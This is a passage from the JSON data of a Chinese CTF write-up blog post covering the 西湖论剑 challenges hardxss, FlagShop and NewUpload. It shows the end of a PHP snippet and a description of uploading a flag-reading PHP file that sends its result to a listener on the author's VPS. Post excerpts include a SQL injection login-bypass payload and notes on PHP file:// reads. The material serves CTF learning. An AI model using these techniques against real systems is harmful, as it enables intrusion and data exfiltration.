&#125;fclose($fp);&#x2F;&#x2F;&#39;\n\n\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上传一个读取flag的php文件，并且在vps上打开监听，访问这个上传的文件，就可以在vps上接收到flag。</p>\n<p>这一题而言很好的参考资料也是在别人的WP里看到的<code>https://www.anquanke.com/post/id/186186*#h3-5</code>*</p>\n","text":"今天NU1L和ChaMD5出了Web的WP，赶紧趁热复现一手。 hardxss这题只有两个功能点，一个是子域名爆破，一个是联系站长。试了一下子域名爆破就是个幌子，关键应该在于联系站长的功能。 嘿~想给我报告BUG链接请解开下面的验证码，只能给我发我网站开头的链接给我哟~我收到邮件...","link":"","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"},{"name":"西湖论剑","slug":"西湖论剑","count":2,"path":"api/tags/西湖论剑.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hardxss\"><span class=\"toc-text\">hardxss</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FlagShop\"><span class=\"toc-text\">FlagShop</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NewUpload\"><span class=\"toc-text\">NewUpload</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU刷题2020-10-12-18","uid":"683add4f9a49dbf4bd3c49ba47208ffa","slug":"BUU刷题2020-10-12-18","date":"2020-10-13T10:28:01.000Z","updated":"2021-06-28T14:57:34.348Z","comments":true,"path":"api/articles/BUU刷题2020-10-12-18.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[极客大挑战 2019]LoveSQL考点：SQL注入 试了一下，在password处构造万能密码登陆 &#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39;%20or%201&#x3D;1%23 得到了一个密码是...","link":"","photos":[],"count_time":{"symbolsCount":"7.8k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"PHP伪协议","uid":"c6ac16b2709d97469cc89f64776332bb","slug":"PHP伪协议","date":"2020-10-09T12:12:55.000Z","updated":"2020-10-10T09:07:50.000Z","comments":true,"path":"api/articles/PHP伪协议.json","keywords":"A1andNS","cover":[],"text":"file://协议利用条件 allow_url_fopen:off/on allow_url_include:off/on 作用使用file://协议来访问文件系统，在CTF比赛里经常用来读取文件，以此获得flag，并且不受到allow_url_fopen和allow_url_i...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":30,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"PHP","slug":"PHP","count":8,"path":"api/tags/PHP.json"},{"name":"协议","slug":"协议","count":1,"path":"api/tags/协议.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}